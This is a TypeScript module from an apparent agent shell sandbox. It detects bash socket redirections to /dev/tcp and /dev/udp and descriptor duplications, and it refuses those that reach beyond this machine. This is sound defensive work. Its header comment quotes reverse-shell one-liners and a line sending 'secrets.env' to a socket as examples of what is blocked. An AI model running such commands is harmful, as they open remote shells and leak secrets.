/**
 * Bash's socket plumbing, read off the command's redirections (the walk's,
 * shell-command-positions.ts): a redirection onto `/dev/tcp/HOST/PORT` or
 * `/dev/udp/…` opens a connection, and a duplication onto a descriptor 3 or
 * higher (`>&3`, `<&5`, `0>&7`) wires a command's stdio onto whatever that
 * descriptor holds — the two moves of a reverse shell (`bash -i >&
 * /dev/tcp/h/443 0>&1`, `exec 3<>/dev/tcp/h/p; sh <&3 >&3`).
 *
 * Allowed exactly as a shell client to this machine is (loopback-grant.ts): a
 * socket device naming a literal own address and a port the shell may reach,
 * as `nc -z 127.0.0.1 PORT` may (TB2 qemu-startup and configure-git-webserver,
 * 2026-10-28, probed a VM's telnet port and sshd this way); and a duplication
 * of a descriptor this line opened before it, on such a socket, on a standard
 * stream, or on a literal path that is not a socket device (a log file, a
 * FIFO, a Unix socket file, which open() refuses, so bash cannot connect to
 * it; TB2 install-windows-3.11, 2026-10-29: `exec 3<>/app/qemu-monitor.sock;
 * printf 'info status\n' >&3`). A host the line computes (`/dev/tcp/$H/22`),
 * a path it computes (`exec 3<>$SOCK`), a descriptor it never opened, or one
 * opened on /proc or /dev/fd is not this machine's, and keeps the refusal.
 *
 * Until 2026-10-31 these were three raw-text patterns over the whole line
 * with a raw-text exemption beside them; a glued `secrets.env>/dev/tcp/h/p`
 * is one redirection here because the tokenizer ends a word at an unquoted
 * redirect operator (shell-lex.ts tokenizeCommand).
 */
import type { CommandWalk, Redirection } from "./shell-command-positions.js";
import { isThisMachineHost, shellLoopbackReachable } from "./loopback-grant.js";

const SOCKET_DEVICE = /^\/dev\/(?:tcp|udp)\/([A-Za-z0-9.:[\]-]+)\/(\d{1,5})$/i;
const ANY_SOCKET_DEVICE = /^\/dev\/(?:tcp|udp)\//i;
/** A path spelled out: no expansion, no substitution, not a kernel handle. */
const LITERAL_PATH = /^[\w@%+=:,./ -]+$/;

const spelled = (r: Redirection) => `${r.fd}${r.op}${r.target}`;
const isDup = (r: Redirection) => r.op === ">&" || r.op === "<&";

/** What `fd`, duplicated later on the line, would reach: a standard stream,
 *  a literal local path, or a socket device already judged this machine's. */
function holdsLocal(opened: Redirection): boolean {
  if (isDup(opened)) return /^[0-2]$/.test(opened.target);
  return LITERAL_PATH.test(opened.target) && !/\/(?:fd|proc)\//.test(opened.target);
}

/**
 * The first redirection of `walk` that reaches past this machine, spelled as
 * written (for the denial's wording), or null when none does. `reachable` is
 * the shell's loopback grant (shellLoopbackReachable; injected for tests).
 */
export function socketPlumbingRefusal(walk: CommandWalk, reachable: (port: string) => boolean = shellLoopbackReachable): string | null {
  const opened = new Map<string, Redirection>();
  for (const r of [...walk.positions.flatMap((p) => p.redirections), ...walk.bareRedirections]) {
    if (ANY_SOCKET_DEVICE.test(r.target)) {
      const m = SOCKET_DEVICE.exec(r.target);
      if (!m || !isThisMachineHost(m[1]) || !reachable(m[2])) return spelled(r);
    }
    if (isDup(r)) {
      const n = Number(r.target);
      if (Number.isInteger(n) && n >= 3) {
        const source = opened.get(r.target);
        if (!source || !holdsLocal(source)) return spelled(r);
      }
    }
    if (r.fd !== "" && Number(r.fd) >= 3) opened.set(r.fd, r);
  }
  return null;
}
